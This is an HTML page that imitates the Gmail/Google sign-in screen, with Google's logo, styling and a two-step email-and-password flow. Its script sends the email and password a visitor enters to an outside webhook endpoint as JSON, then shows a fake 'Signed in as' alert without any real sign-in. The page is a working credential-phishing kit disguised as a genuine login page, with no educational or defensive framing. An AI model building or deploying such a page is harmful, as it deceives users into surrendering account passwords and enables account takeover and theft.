<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Gmail â€“ Sign in</title>
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet"/>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: "Google Sans", Arial, sans-serif;
      background: #f1f3f4;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #202124;
      font-size: 14px;
    }
    .center-box {
      background: #fff;
      padding: 48px 40px 36px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,.1);
      width: 100%;
      max-width: 450px;
    }
    .logo {
      margin-bottom: 10px;
    }
    h1 {
      font-size: 24px;
      font-weight: 400;
      margin-bottom: 8px;
    }
    p {
      color: #5f6368;
      margin-bottom: 30px;
    }
    .field {
      position: relative;
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      height: 56px;
      padding: 16px 14px 6px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      background: transparent;
    }
    label {
      position: absolute;
      left: 14px;
      top: 18px;
      color: #5f6368;
      pointer-events: none;
      transition: 0.2s;
      background: #fff;
      padding: 0 4px;
    }
    input:focus + label,
    input:not(:placeholder-shown) + label {
      top: -8px;
      font-size: 12px;
      color: #1a73e8;
    }
    input:focus {
      outline: none;
      border: 2px solid #1a73e8;
    }
    a {
      color: #1a73e8;
      text-decoration: none;
      font-weight: 500;
    }
    .forgot {
      display: block;
      margin: -20px 0 30px;
    }
    .guest {
      color: #5f6368;
      margin-bottom: 32px;
      line-height: 1.5;
    }
    .actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    button {
      background: #1a73e8;
      color: #fff;
      border: none;
      padding: 10px 24px;
      border-radius: 4px;
      font-size: 14px;
      cursor: pointer;
    }
    button:hover {
      background: #1765cc;
    }
    footer {
      width: 100%;
      max-width: 450px;
      margin-top: 24px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 12px;
      color: #5f6368;
    }
    nav a {
      margin-left: 20px;
    }
    select {
      border: none;
      background: transparent;
      color: #5f6368;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="center-box">
    <img class="logo" src="https://accounts.google.com/gsi/style/logos/googlelogo_color_92x36dp.png" alt="Google">
    <h1>Sign in</h1>
    <p>Use your Google Account</p>

    <form id="loginForm">
      <!-- Email Step -->
      <div class="field" id="emailField">
        <input type="email" id="email" required placeholder=" " />
        <label for="email">Email or phone</label>
      </div>

      <!-- Password Step -->
      <div class="field" id="passwordField" style="display: none;">
        <input type="password" id="password" required placeholder=" " />
        <label for="password">Enter your password</label>
      </div>

      <a href="#" class="forgot" id="forgotLink">Forgot email?</a>

      <div class="guest" id="guestNote">
        Not your computer? Use a private browsing window to sign in. <a href="#">Learn more</a>
      </div>

      <div class="actions">
        <a href="#" class="create">Create account</a>
        <button type="submit" id="submitBtn">Next</button>
      </div>
    </form>
  </div>

  <footer>
    <select>
      <option value="en">English (United States)</option>
    </select>
    <nav>
      <a href="#">Help</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
    </nav>
  </footer>

  <script>
    const loginForm = document.getElementById("loginForm");
    const emailField = document.getElementById("emailField");
    const passwordField = document.getElementById("passwordField");
    const submitBtn = document.getElementById("submitBtn");
    const forgotLink = document.getElementById("forgotLink");
    const guestNote = document.getElementById("guestNote");

    let step = 1;

    loginForm.addEventListener("submit", async function (e) {
      e.preventDefault();

      if (step === 1) {
        // Show password field
        emailField.querySelector("input").disabled = true;
        passwordField.style.display = "block";
        submitBtn.textContent = "Sign in";
        forgotLink.style.display = "none";
        guestNote.style.display = "none";
        step = 2;
        return;
      }

      // Step 2: Submit credentials to webhook
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      await fetch("https://play.svix.com/in/e_Cb6Z8mEkZaEi40pbz4To7voWnZn/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password })
      });

      alert("Signed in as " + email);
    });
  </script>
</body>
</html>
